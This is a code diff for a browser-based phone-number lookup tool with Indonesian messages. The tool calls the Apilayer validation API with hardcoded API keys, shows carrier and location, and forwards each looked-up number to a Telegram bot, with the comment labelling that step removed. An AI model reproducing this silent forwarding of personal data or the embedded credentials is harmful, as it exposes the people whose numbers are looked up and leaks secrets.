@@ -2,26 +2,43 @@ function lookupPhone() {
   const phone = document.getElementById("phone").value;
   const resultBox = document.getElementById("result");
 
-  // Panggil API publik (Apilayer)
+  if (!phone.startsWith("+")) {
+    resultBox.innerHTML = "Gunakan format internasional (contoh: +628123456789)";
+    return;
+  }
+
   fetch(`https://api.apilayer.com/number_verification/validate?number=${phone}`, {
     headers: {
-      "apikey": "kpCwR6fOv5V82hQKLVIdWLXTt0oeU0c6"
+      "apikey": "axl1F57lkrG7iorwlHBQuocWAjHhTl7O"
     }
   })
   .then(res => res.json())
   .then(data => {
+    console.log("API response:", data); // Buat debug di console
+
+    if (!data.valid) {
+      resultBox.innerHTML = "Nomor tidak valid atau tidak ditemukan.";
+      return;
+    }
+
     let result = `
-      <strong>Nomor:</strong> ${data.international_format}<br>
-      <strong>Negara:</strong> ${data.country_name}<br>
-      <strong>Lokasi:</strong> ${data.location}<br>
-      <strong>Operator:</strong> ${data.carrier}
+      <strong>Nomor:</strong> ${data.international_format || "-"}<br>
+      <strong>Negara:</strong> ${data.country_name || "-"}<br>
+      <strong>Lokasi:</strong> ${data.location || "-"}<br>
+      <strong>Operator:</strong> ${data.carrier || "-"}
     `;
     resultBox.innerHTML = result;
 
-    // Kirim ke bot Telegram
-    sendToTelegram(data.international_format, data.carrier, data.location);
+    sendToTelegram(
+      data.international_format || phone,
+      data.carrier || "Tidak terdeteksi",
+      data.location || "Tidak diketahui"
+    );
   })
-  .catch(() => resultBox.innerHTML = "Gagal mengambil data.");
+  .catch((err) => {
+    console.error("Fetch error:", err);
+    resultBox.innerHTML = "Gagal menghubungi server.";
+  });
 }
 
 function sendToTelegram(phone, carrier, location) {
